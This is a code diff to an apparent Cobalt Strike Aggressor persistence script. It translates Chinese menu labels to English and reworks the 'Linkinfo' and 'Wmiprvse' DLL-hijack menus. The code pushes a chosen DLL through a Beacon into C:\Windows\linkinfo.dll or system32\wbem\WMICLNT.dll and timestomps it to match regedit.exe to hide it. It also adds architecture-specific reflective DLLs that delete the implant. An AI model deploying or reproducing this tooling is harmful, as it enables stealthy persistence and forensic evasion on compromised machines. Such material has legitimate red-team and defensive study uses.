@@ -1060,12 +1060,12 @@ menu "DLL加载"{
 	
 	# https://www.cnblogs.com/websecyw/p/12561630.html
 	menu "Linkinfo" {
-		item "上传linkinfo.dll"{
+		item "Upload linkinfo.dll"{
 			local('$bid');
 			foreach $bid ($1){
 				#binput($bid, "blockdlls start"); 
 				#bblockdlls($bid, true); 
-				$Dialog = dialog("上传linkinfo.dll", %(linkinfoFile => "", bid => $bid), 
+				$Dialog = dialog("Upload linkinfo.dll", %(linkinfoFile => "", bid => $bid), 
 					lambda({
 						local('$bid $linkinfoFile $TempFile');
 						$TempFile = "C:\\windows\\linkinfo.dll";
@@ -1079,37 +1079,51 @@ menu "DLL加载"{
 						btimestomp($bid,$TempFile,"C:\\windows\\regedit.exe");
 					})
 				);
-				dialog_description($Dialog, "上传linkinfo.dll到C:\\Windows\\");
+				dialog_description($Dialog, "Upload linkinfo.dll To C:\\Windows\\");
 				drow_file($Dialog, "linkinfoFile", "File: ");
-				dbutton_action($Dialog, "执行");
+				dbutton_action($Dialog, "Execute");
 				dialog_show($Dialog);
 			}
 		}
 		
-		item "清理linkinfo.dll"{
-			local('$bid $TempFile');
+		item "Clean linkinfo.dll"{
+			local('$bid $TempFile $arch $dll');
 			$TempFile = "C:\\windows\\linkinfo.dll";
 			foreach $bid ($1){
-				if( lc(binfo($bid, "process")) eq "explorer.exe"){
-					
-				}
 				blog($bid, "-------".getnow()."-------");
-				blog($bid , "The file will be delete after restart.");
-				$Data = "2 C:\\windows\\linkinfo.dll 1";
-				bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
+				$arch = binfo($bid, "arch");
+				blog($bid,"Beacon Arch is $arch");
+				if($arch eq "x86"){
+					$dll = "/FileControler/FileControler_x86.dll";
+				}else if ($arch eq "x64"){
+					$dll = "/FileControler/FileControler_x64.dll";	
+				}else{
+					berror($bid,"Not Found Arch!");
+					return;
+				}
+				
+				if( lc(binfo($bid, "process")) eq "explorer.exe"){
+					blog($bid , "The file will be delete after restart.");
+					$Data = "2 C:\\windows\\linkinfo.dll 1";
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"),$dll ),$Data, "Del linkinfo.dll after reboot.", 5000);
+				}else{
+					blog($bid,"Try to delete $TempFile (If the dll loaded , delete will be return failed.)");
+					$Data = "0 C:\\windows\\linkinfo.dll 1";
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), $dll ),$Data, "Del linkinfo.dll.", 5000);
+				}
 			}
 		}
 	}
 	
 	
-	menu "wmiprvse" {
+	menu "Wmiprvse" {
 		item "Upload WMICLNT.dll"{
 			local('$bid');
 			foreach $bid ($1){
 				$Dialog = dialog("Upload WMICLNT.dll", %(dllfile => "", bid => $bid), 
 					lambda({
 						local('$bid $dllfile $TempFile');
-						$TempFile = "C:\\windows\\linkinfo.dll";
+						$TempFile = "C:\\windows\\system32\\wbem\\WMICLNT.dll";
 						$dllfile = $3['dllfile'];
 						$bid = $3['bid'];
 						blog($bid,"Upload ".$dllfile." to $TempFile ");	
@@ -1118,26 +1132,41 @@ menu "DLL加载"{
 						closef($handle);
 						bupload_raw($bid,$TempFile,$bdata);
 						btimestomp($bid,$TempFile,"C:\\windows\\regedit.exe");
+						
 					})
 				);
 				dialog_description($Dialog, "Upload WMICLNT.dll in C:\\windows\\system32\\wbem\\");
 				drow_file($Dialog, "dllfile", "File: ");
-				dbutton_action($Dialog, "执行");
+				dbutton_action($Dialog, "Execute");
 				dialog_show($Dialog);
 			}
 		}
-		
-		item "清理linkinfo.dll"{
-			local('$bid $TempFile');
-			$TempFile = "C:\\windows\\linkinfo.dll";
+				
+		item "Clean WMICLNT.dll"{
+			local('$bid $TempFile $arch $dll');
+			$TempFile = "C:\\windows\\system32\\wbem\\WMICLNT.dll";
 			foreach $bid ($1){
-				if( lc(binfo($bid, "process")) eq "explorer.exe"){
-					
-				}
 				blog($bid, "-------".getnow()."-------");
-				blog($bid , "The file will be delete after restart.");
-				$Data = "2 C:\\windows\\linkinfo.dll 1";
-				bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
+				$arch = binfo($bid, "arch");
+				blog($bid,"Beacon Arch is $arch");
+				if($arch eq "x86"){
+					$dll = "/FileControler/FileControler_x86.dll";
+				}else if ($arch eq "x64"){
+					$dll = "/FileControler/FileControler_x64.dll";	
+				}else{
+					berror($bid,"Not Found Arch!");
+					return;
+				}
+				
+				if( lc(binfo($bid, "process")) eq "explorer.exe"){
+					blog($bid , "The file will be delete after restart.");
+					$Data = "2 $TempFile 1";
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"),$dll ),$Data, "Del WMICLNT.dll after reboot.", 5000);
+				}else{
+					blog($bid,"Try to delete $TempFile (If the dll loaded , delete will be return failed.)");
+					$Data = "0 $TempFile 1";
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), $dll ),$Data, "Del WMICLNT.dll.", 5000);
+				}
 			}
 		}
 	}
